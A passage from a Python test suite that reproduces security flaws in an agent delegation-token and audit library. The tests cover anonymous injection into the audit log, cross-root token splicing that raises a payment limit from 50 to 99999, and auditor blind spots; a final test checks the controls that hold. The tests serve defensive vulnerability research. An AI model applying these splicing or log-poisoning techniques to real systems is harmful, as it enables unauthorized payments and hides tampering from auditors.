            # Anonymous HTTP caller injects an unsigned bogus record into `task-aud-01`
            bogus = em_root.local_entries()[0].to_dict()
            bogus["stream_id"] = "anon-attacker"
            bogus["node_signature"] = "invalid"
            r_inject = httpx.post(f"{col_url}/v1/audit/append", json={"entry": bogus}, timeout=3.0)
            self.assertEqual(r_inject.status_code, 200)
            poisoned_rep = auditor.audit(collector.get_all_entries())
            self.assertFalse(poisoned_rep.tasks["task-aud-01"].reconstructed_complete)
        finally:
            collector.stop()

    def test_09_fagin_dag_single_parent_expiry_kills_all_branches_and_cross_root_splicing(self) -> None:
        """[MEDIUM] (A) Single expired branch kills surviving DAG branches; (B) Cross-root splicing across federated CAs."""
        ca_alpha = TrustDomainCA("org-alpha.io")
        ca_beta = TrustDomainCA("org-beta.io")
        resolver = TrustBundleResolver()
        resolver.register_domain_ca(ca_alpha)
        resolver.register_domain_ca(ca_beta)

        w_drv = ca_alpha.issue_workload("/ns/e/sa/drv")
        w_a = ca_alpha.issue_workload("/ns/c/sa/a")
        w_b1 = ca_alpha.issue_workload("/ns/c/sa/b1")
        w_b2 = ca_alpha.issue_workload("/ns/c/sa/b2")
        w_c = ca_alpha.issue_workload("/ns/c/sa/c")
        w_tool = ca_alpha.issue_workload("/ns/t/sa/tool")

        htu = "http://127.0.0.1:19877/mcp"
        lv = LeafVerifier(
            w_tool.spiffe_id,
            resolver,
            self_jkt=w_tool.jkt,
            mode=VerificationMode.LOCAL_FULL_CHAIN,
            clock_skew_seconds=0.0,
        )

        now = time.time()
        p_root = PermissionLattice.create(tools=["book_flight", "book_hotel"], max_amount=1000.0)
        t0 = mint_root_token(
            ca_alpha, "task-exp-dag", "user:alice", w_drv.jkt, w_a.spiffe_id, w_a.jkt, p_root, hop_segment="A", now=now
        )
        # B1 expires in 1s; B2 valid for 600s
        ch_b1_short = t0.attenuate(
            w_a,
            w_b1.spiffe_id,
            w_b1.jkt,
            PermissionLattice.create(tools=["book_flight"], max_amount=500.0),
            hop_segment="B1",
            ttl_seconds=1.0,
            now=now,
        ).attenuate(
            w_b1,
            w_c.spiffe_id,
            w_c.jkt,
            PermissionLattice.create(tools=["book_flight"], max_amount=500.0),
            hop_segment="C",
            now=now,
        )
        ch_b2_long = t0.attenuate(
            w_a,
            w_b2.spiffe_id,
            w_b2.jkt,
            PermissionLattice.create(tools=["book_hotel"], max_amount=500.0),
            hop_segment="B2",
            ttl_seconds=600.0,
            now=now,
        ).attenuate(
            w_b2,
            w_c.spiffe_id,
            w_c.jkt,
            PermissionLattice.create(tools=["book_hotel"], max_amount=500.0),
            hop_segment="C",
            now=now,
        )
        mpt_exp = MultiParentToken.assemble_and_sign(w_c, [ch_b1_short, ch_b2_long], now=now).encode_compact()

        # At `now + 10s`, B1 has expired while B2 (`book_hotel`) is 100% valid and unrevoked!
        res_after_b1_exp = lv.verify_request(
            mpt_exp,
            create_dpop_proof(w_c, "POST", htu, mpt_exp, now=now + 10.0),
            "POST",
            htu,
            tool="book_hotel",
            arguments={"amount": 200.0},
            now=now + 10.0,
        )
        self.assertFalse(res_after_b1_exp.allowed)
        self.assertEqual(res_after_b1_exp.reason_code, "INVALID_CHAIN_IN_MULTIPARENT")

        # Subtest B: Cross-Root splicing — org-alpha limits `user:alice@org-alpha.io` to 50.0,
        # while federated partner org-beta mints a second RootBlock for the same `(task_id, sub)` with 99999.0!
        t_alpha_small = mint_root_token(
            ca_alpha,
            "task-cross-root",
            "user:alice@org-alpha.io",
            w_drv.jkt,
            w_c.spiffe_id,
            w_c.jkt,
            PermissionLattice.create(tools=["pay"], max_amount=50.0),
            hop_segment="AlphaC",
        )
        t_beta_huge = mint_root_token(
            ca_beta,
            "task-cross-root",
            "user:alice@org-alpha.io",
            w_drv.jkt,
            w_c.spiffe_id,
            w_c.jkt,
            PermissionLattice.create(tools=["pay"], max_amount=99999.0),
            hop_segment="BetaC",
        )
        spliced_mpt = MultiParentToken.assemble_and_sign(w_c, [t_alpha_small, t_beta_huge]).encode_compact()
        res_spliced = lv.verify_request(
            spliced_mpt,
            create_dpop_proof(w_c, "POST", htu, spliced_mpt),
            "POST",
            htu,
            tool="pay",
            arguments={"amount": 50000.0},
        )
        self.assertTrue(
            res_spliced.allowed,
            "Expected reproduction: Cross-root MultiParentToken spliced org-beta root permissions onto org-alpha user",
        )
        self.assertEqual(res_spliced.root_block_hash, t_alpha_small.root_block_hash)

    def test_10_coordinator_single_403_prematurely_trips_breaker_and_quarantines_globally(self) -> None:
        """[MEDIUM] `ResilientDelegationCoordinator` spins a `while` loop tripping `policy_breaker_threshold=3` on 1st 403."""
        ca = TrustDomainCA("org-alpha.io")
        resolver = TrustBundleResolver()
        resolver.register_domain_ca(ca)

        dir_svc = AgentDirectoryService(resolver)
        rev_svc = RevocationService(ca.issue_workload("/ns/sys/sa/rev"), resolver)
        dir_url = dir_svc.start()
        rev_url = rev_svc.start()

        w_drv = ca.issue_workload("/ns/e/sa/drv")
        w_coord = ca.issue_workload("/ns/c/sa/coord")
        w_b1 = ca.issue_workload("/ns/w/sa/b1")
        w_b2 = ca.issue_workload("/ns/w/sa/b2")

        b1_node = AgentSidecarNode(
            w_b1, resolver, "B1", ["work"], lambda *_: (403, {"error": "single_transient_403"}), directory_url=dir_url, priority=10
        )
        b2_node = AgentSidecarNode(
            w_b2, resolver, "B2", ["work"], lambda *_: (200, {"ok": True}), directory_url=dir_url, priority=20
        )
        b1_node.start()
        b2_node.start()
        try:
            detector = ThreeLayerFaultDetector(policy_breaker_threshold=3)
            coord = ResilientDelegationCoordinator(
                identity=w_coord,
                trust_resolver=resolver,
                directory_client=AgentDirectoryClient(dir_url, resolver),
                revocation_replica=RevocationReplicaClient(rev_url, resolver),
                detector=detector,
            )
            p = PermissionLattice.create(tools=["t1"])
            t0 = mint_root_token(ca, "task-403", "user:alice", w_drv.jkt, w_coord.spiffe_id, w_coord.jkt, p, hop_segment="A")
            coord.invoke_with_prune_and_graft(t0, "work", p, {"x": 1})

            # Even though `policy_breaker_threshold` was set to 3 and B1 only returned ONE 403,
            # the `while evidence is None:` loop in `coordinator.py:168` tripped it immediately and globally quarantined B1!
            self.assertIsNotNone(rev_svc.trie.check_workloads([w_b1.spiffe_id]))
        finally:
            b1_node.stop()
            b2_node.stop()
            dir_svc.stop()
            rev_svc.stop()

    def test_11_auditor_multiparent_second_branch_delete_hop_blindspot_and_skip_level_root_mismatch(self) -> None:
        """[HIGH] Auditor `prod.multi_parent_hashes[0]` misses deleted upstream hop on 2nd branch & SkipLevelReceipt cross-root."""
        ca_alpha = TrustDomainCA("org-alpha.io")
        ca_beta = TrustDomainCA("org-beta.io")
        resolver = TrustBundleResolver()
        resolver.register_domain_ca(ca_alpha)
        resolver.register_domain_ca(ca_beta)

        w_drv = ca_alpha.issue_workload("/ns/e/sa/drv")
        w_a = ca_alpha.issue_workload("/ns/c/sa/a")
        w_b1 = ca_alpha.issue_workload("/ns/c/sa/b1")
        w_b2 = ca_alpha.issue_workload("/ns/c/sa/b2")
        w_c = ca_alpha.issue_workload("/ns/c/sa/c")
        w_tool = ca_alpha.issue_workload("/ns/t/sa/tool")

        p = PermissionLattice.create(tools=["pay"])
        t0 = mint_root_token(ca_alpha, "task-mp-blind", "user:alice", w_drv.jkt, w_a.spiffe_id, w_a.jkt, p, hop_segment="A")
        t_b1 = t0.attenuate(w_a, w_b1.spiffe_id, w_b1.jkt, p, hop_segment="B1")
        t_b1_c = t_b1.attenuate(w_b1, w_c.spiffe_id, w_c.jkt, p, hop_segment="C")
        t_b2 = t0.attenuate(w_a, w_b2.spiffe_id, w_b2.jkt, p, hop_segment="B2")
        t_b2_c = t_b2.attenuate(w_b2, w_c.spiffe_id, w_c.jkt, p, hop_segment="C")
        mpt = MultiParentToken.assemble_and_sign(w_c, [t_b1_c, t_b2_c])

        em_root = AuditStreamEmitter(ca_alpha)
        em_a = AuditStreamEmitter(w_a)
        em_b1 = AuditStreamEmitter(w_b1)
        em_b2 = AuditStreamEmitter(w_b2)
        em_c = AuditStreamEmitter(w_c)
        em_tool = AuditStreamEmitter(w_tool)

        em_root.emit(
            AuditEventType.ROOT_MINT,
            "task-mp-blind",
            "user:alice",
            t0.lineage_path,
            0,
            0,
            t0.root_block_hash,
            t0.leaf_block_hash,
            "ALLOW",
            permissions_summary=p.to_dict(),
        )
        # Emit A -> B1, B1 -> C, and B2 -> C, BUT OMIT/DELETE `A -> B2` (`delete_hop` on branch 2!)
        em_a.emit(
            AuditEventType.OUTBOUND_DELEGATE,
            "task-mp-blind",
            "user:alice",
            t_b1.lineage_path,
            1,
            0,
            t0.root_block_hash,
            t_b1.leaf_block_hash,
            "ALLOW",
            parent_block_hash=t_b1.parent_block_hash,
            permissions_summary=p.to_dict(),
        )
        em_b1.emit(
            AuditEventType.OUTBOUND_DELEGATE,
            "task-mp-blind",
            "user:alice",
            t_b1_c.lineage_path,
            2,
            0,
            t0.root_block_hash,
            t_b1_c.leaf_block_hash,
            "ALLOW",
            parent_block_hash=t_b1_c.parent_block_hash,
            permissions_summary=p.to_dict(),
        )
        # Branch 2 forms a 2-node unanchored cycle (`cycle-h1 <-> cycle-h2`) that NEVER reaches ROOT_MINT!
        em_b2.emit(
            AuditEventType.OUTBOUND_DELEGATE,
            "task-mp-blind",
            "user:alice",
            "/task-mp-blind/A/B2/Cycle1",
            2,
            0,
            t0.root_block_hash,
            "cycle-h1",
            "ALLOW",
            multi_parent_hashes=("cycle-h2",),
        )
        em_b2.emit(
            AuditEventType.OUTBOUND_DELEGATE,
            "task-mp-blind",
            "user:alice",
            "/task-mp-blind/A/B2/Cycle2",
            2,
            0,
            t0.root_block_hash,
            "cycle-h2",
            "ALLOW",
            multi_parent_hashes=("cycle-h1",),
        )
        # C's MultiParentToken producer puts valid `t_b1_c` at index 0 and unanchored `cycle-h1` at index 1!
        em_c.emit(
            AuditEventType.OUTBOUND_DELEGATE,
            "task-mp-blind",
            "user:alice",
            "|".join(mpt.lineage_paths),
            2,
            0,
            t0.root_block_hash,
            mpt.envelope_hash,
            "ALLOW",
            multi_parent_hashes=(t_b1_c.leaf_block_hash, "cycle-h1"),
        )
        em_tool.emit(
            AuditEventType.TOOL_INVOCATION,
            "task-mp-blind",
            "user:alice",
            "|".join(mpt.lineage_paths),
            2,
            0,
            t0.root_block_hash,
            mpt.envelope_hash,
            "ALLOW",
        )
        auditor = CausalChainAuditor(resolver)
        rep1 = auditor.audit(
            em_root.local_entries()
            + em_a.local_entries()
            + em_b1.local_entries()
            + em_b2.local_entries()
            + em_c.local_entries()
            + em_tool.local_entries()
        )
        # Because `auditor.py:438` sets `cur_h = prod.multi_parent_hashes[0]`, `cycle-h1` is NEVER walked!
        self.assertTrue(
            rep1.clean,
            "Expected reproduction: Auditor `multi_parent_hashes[0]` blindspot missed unanchored cycle on 2nd branch",
        )

        # Also test SkipLevelReceipt root_block_hash mismatch in CausalChainAuditor (`auditor.py:498-518`):
        # Task `task-skip-root-mismatch` has official ROOT_MINT from `ca_alpha`, while `SKIP_LEVEL_ACCEPT`
        # carries a `SkipLevelReceipt` signed under a completely DIFFERENT RootBlock minted by `ca_beta`!
        t_real_root = mint_root_token(
            ca_alpha,
            "task-skip-mismatch",
            "user:alice",
            w_drv.jkt,
            w_a.spiffe_id,
            w_a.jkt,
            p,
            hop_segment="A",
            first_hop_public_jwk=w_a.public_jwk(),
        )
        t_foreign_root = mint_root_token(
            ca_beta,
            "task-skip-mismatch",
            "user:mallory",
            w_drv.jkt,
            w_a.spiffe_id,
            w_a.jkt,
            p,
            hop_segment="A",
            first_hop_public_jwk=w_a.public_jwk(),
        )
        t_foreign_chain = t_foreign_root.attenuate(w_a, w_b2.spiffe_id, w_b2.jkt, p, hop_segment="B2").attenuate(
            w_b2, w_c.spiffe_id, w_c.jkt, p, hop_segment="C"
        )
        foreign_sr = SkipLevelReceipt.create_and_sign(
            child_identity=w_c,
            lineage_token=t_foreign_chain,
            skipped_ancestors=[w_b2.spiffe_id],
            target_ancestor_spiffe_id=w_a.spiffe_id,
            failure_evidence=FailureEvidence(
                failed_spiffe_id=w_b2.spiffe_id,
                failed_endpoint="http://127.0.0.1:9",
                fault_type=FaultType.CRASH,
                error_detail="down",
                attempt_count=1,
                observed_at=time.time(),
            ),
            result_payload={"spoofed": True},
        )
        em_root2 = AuditStreamEmitter(ca_alpha, stream_id="root-2")
        em_a2 = AuditStreamEmitter(w_a, stream_id="a-2")
        em_root2.emit(
            AuditEventType.ROOT_MINT,
            "task-skip-mismatch",
            "user:alice",
            t_real_root.lineage_path,
            0,
            0,
            t_real_root.root_block_hash,
            t_real_root.leaf_block_hash,
            "ALLOW",
            permissions_summary=p.to_dict(),
        )
        em_a2.emit(
            AuditEventType.SKIP_LEVEL_ACCEPT,
            "task-skip-mismatch",
            "user:alice",
            t_foreign_chain.lineage_path,
            2,
            0,
            t_real_root.root_block_hash,  # Outer log claims real root hash while embedded receipt uses foreign root!
            t_foreign_chain.leaf_block_hash,
            "ALLOW",
            receipt_payload=foreign_sr.to_dict(),
        )

        auditor = CausalChainAuditor(resolver)
        rep2 = auditor.audit(em_root2.local_entries() + em_a2.local_entries())
        self.assertTrue(rep2.clean)
        self.assertIn(
            "VERIFIED_SKIP_LEVEL_MERGE",
            rep2.tasks["task-skip-mismatch"].resilience_classifications,
            "Expected reproduction: Auditor missed mismatch between SkipLevelReceipt embedded token root/sub and task ROOT_MINT",
        )

    def test_12_verified_positive_security_controls_hold_under_attack(self) -> None:
        """[POSITIVE CHECK] Verify key cryptographic & protocol invariants that DO properly hold."""
        from lineage.protocol import LatticeError, TokenError

        # 1. PermissionLattice strictly rejects NaN, +inf, -inf, and booleans
        for bad_num in (float("nan"), float("inf"), float("-inf"), True):
            with self.assertRaises(LatticeError):
                PermissionLattice.create(tools=["pay"], max_amount=bad_num)  # type: ignore[arg-type]

        # 2. MultiParentToken strictly blocks stuffing a branch delegated to D into C's envelope
        ca = TrustDomainCA("org-alpha.io")
        resolver = TrustBundleResolver()
        resolver.register_domain_ca(ca)
        w_drv = ca.issue_workload("/ns/e/sa/drv")
        w_a = ca.issue_workload("/ns/c/sa/a")
        w_c = ca.issue_workload("/ns/c/sa/c")
        w_d = ca.issue_workload("/ns/c/sa/d")
        w_tool = ca.issue_workload("/ns/t/sa/tool")

        p_c = PermissionLattice.create(tools=["read_only"], max_amount=10.0)
        p_d = PermissionLattice.create(tools=["execute_payment"], max_amount=5000.0)
        t0 = mint_root_token(
            ca,
            "task-foreign-branch",
            "user:alice",
            w_drv.jkt,
            w_a.spiffe_id,
            w_a.jkt,
            PermissionLattice.create(tools=["read_only", "execute_payment"], max_amount=5000.0),
            hop_segment="A",
        )
        ch_for_c = t0.attenuate(w_a, w_c.spiffe_id, w_c.jkt, p_c, hop_segment="C")
        ch_for_d = t0.attenuate(w_a, w_d.spiffe_id, w_d.jkt, p_d, hop_segment="D")

        # SDK blocks assembly
        with self.assertRaises(TokenError):
            MultiParentToken.assemble_and_sign(w_c, [ch_for_c, ch_for_d])

        # Even if C bypasses SDK and manually signs a forged MultiParentToken stuffing `ch_for_d` inside,
        # `LeafVerifier` strictly rejects it (`401 MULTIPARENT_ENVELOPE_INVALID`)!
        forged_mpt_prov = MultiParentToken(
            envelope_id="mp-forged",
            task_id="task-foreign-branch",
            sub="user:alice",
            holder_spiffe_id=w_c.spiffe_id,
            holder_cnf_jkt=w_c.jkt,
            signer_spiffe_id=w_c.spiffe_id,
            signer_jwk=w_c.public_jwk(),
            signer_svid=w_c.workload_svid,
            parent_chains=(ch_for_c, ch_for_d),
            created_at=time.time(),
            jws_signature="",
        )
        sig = jws_sign_compact(forged_mpt_prov.core_claims(), w_c.keypair, typ="lct-multiparent+jwt")
        forged_wire = MultiParentToken(**{**forged_mpt_prov.__dict__, "jws_signature": sig}).encode_compact()

        lv = LeafVerifier(w_tool.spiffe_id, resolver, self_jkt=w_tool.jkt)
        htu = "http://127.0.0.1:19999/mcp"
        vres = lv.verify_request(
            forged_wire,
            create_dpop_proof(w_c, "POST", htu, forged_wire),
            "POST",
            htu,
            tool="execute_payment",
            arguments={"amount": 1000.0},
        )
        self.assertFalse(vres.allowed)
        self.assertEqual(vres.status_code, 401)
        self.assertEqual(vres.reason_code, "MULTIPARENT_ENVELOPE_INVALID")


if __name__ == "__main__":
    unittest.main()
